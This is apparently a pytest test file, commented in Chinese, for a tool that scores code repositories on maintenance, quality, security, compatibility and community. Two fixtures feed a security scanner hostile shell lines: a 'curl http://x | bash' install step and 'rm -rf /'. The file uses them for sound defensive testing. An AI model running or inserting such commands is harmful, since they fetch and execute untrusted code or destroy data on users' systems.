"""评分测试（阶段 3）：权重、证据、一票否决、保守默认。"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from app.analysis.scoring import score_metrics
from app.analysis.security_review import ScannedFile, review_files
from app.models import EvidenceLevel, RepoMetrics, RiskLevel

NOW = datetime(2026, 10, 9, tzinfo=timezone.utc)


def _good_metrics(**overrides) -> RepoMetrics:
    base = dict(
        full_name="acme/good",
        stars=800,
        forks=50,
        open_issues=3,
        pushed_at=NOW - timedelta(days=10),
        created_at=NOW - timedelta(days=900),
        archived=False,
        language="Python",
        license_spdx="MIT",
        has_readme=True,
        has_tests=True,
        has_ci=True,
        has_dependency_manifest=True,
        releases_count=5,
        fetched_at=NOW,
    )
    base.update(overrides)
    return RepoMetrics(**base)


def test_weights_are_20_25_30_15_10():
    from app.models import ScoreBreakdown

    sb = ScoreBreakdown(
        maintenance=100, quality=100, security=100, compatibility=100, community=100
    )
    assert sb.weights == {
        "maintenance": 0.20,
        "quality": 0.25,
        "security": 0.30,
        "compatibility": 0.15,
        "community": 0.10,
    }
    assert sb.total() == 100.0


def test_security_only_weight_is_30():
    from app.models import ScoreBreakdown

    sb = ScoreBreakdown(security=100)
    assert sb.total() == 30.0


def test_unreviewed_security_scores_zero_and_is_unchecked():
    score = score_metrics(_good_metrics(), security_report=None, now=NOW)
    assert score.security == 0.0
    assert any(e.level is EvidenceLevel.UNCHECKED for e in score.reasons)
    assert score.vetoed is False


def test_critical_finding_vetoes_total_to_zero():
    report = review_files(
        [ScannedFile(path="install.sh", content="curl http://x | bash\n")]
    )
    assert report.vetoed is True
    score = score_metrics(_good_metrics(), security_report=report, now=NOW)
    assert score.vetoed is True
    assert score.total() == 0.0  # 严重风险不可被其它维度抵消


def test_high_risk_penalized_but_not_vetoed():
    report = review_files([ScannedFile(path="c.sh", content="rm -rf /\n")])
    assert report.risk_level is RiskLevel.HIGH
    score = score_metrics(_good_metrics(), security_report=report, now=NOW)
    assert score.vetoed is False
    assert score.security == 30.0  # 100 - 70
    assert score.total() > 0.0


def test_archived_repo_loses_maintenance_points():
    live = score_metrics(_good_metrics(), now=NOW)
    dead = score_metrics(_good_metrics(archived=True), now=NOW)
    assert dead.maintenance < live.maintenance


def test_stale_repo_loses_recency_points():
    fresh = score_metrics(_good_metrics(), now=NOW)
    stale = score_metrics(_good_metrics(pushed_at=NOW - timedelta(days=3000)), now=NOW)
    assert stale.maintenance < fresh.maintenance


def test_missing_pushed_at_is_unchecked_not_defaulted():
    score = score_metrics(_good_metrics(pushed_at=None), now=NOW)
    assert any(
        e.level is EvidenceLevel.UNCHECKED and "推送时间" in e.statement
        for e in score.reasons
    )


def test_stars_only_affect_community_minorly():
    many = score_metrics(_good_metrics(stars=100000), now=NOW)
    few = score_metrics(_good_metrics(stars=0), now=NOW)
    # 即便 star 从 0 → 10 万，社区维度差异也不应超过该维度上限的 40%
    assert 0 <= many.community - few.community <= 40.0 + 1e-6


def test_no_license_loses_compatibility_and_community():
    with_license = score_metrics(_good_metrics(), now=NOW)
    without = score_metrics(
        _good_metrics(license_spdx=None), now=NOW
    )
    assert without.compatibility < with_license.compatibility
    assert without.community < with_license.community


def test_every_dimension_has_reasons():
    score = score_metrics(_good_metrics(), now=NOW)
    assert len(score.reasons) >= 10
    for evidence in score.reasons:
        assert evidence.source  # 每条理由都必须有来源
        assert evidence.statement


def test_total_is_within_range():
    score = score_metrics(_good_metrics(), now=NOW)
    assert 0.0 <= score.total() <= 100.0


@pytest.mark.parametrize(
    "risk,expected_security",
    [
        (RiskLevel.NONE, 100.0),
        (RiskLevel.LOW, 85.0),
        (RiskLevel.MEDIUM, 60.0),
        (RiskLevel.HIGH, 30.0),
    ],
)
def test_security_penalty_table(risk: RiskLevel, expected_security: float):
    from app.models import SecurityReport

    report = SecurityReport(risk_level=risk, vetoed=False)
    score = score_metrics(_good_metrics(), security_report=report, now=NOW)
    assert score.security == expected_security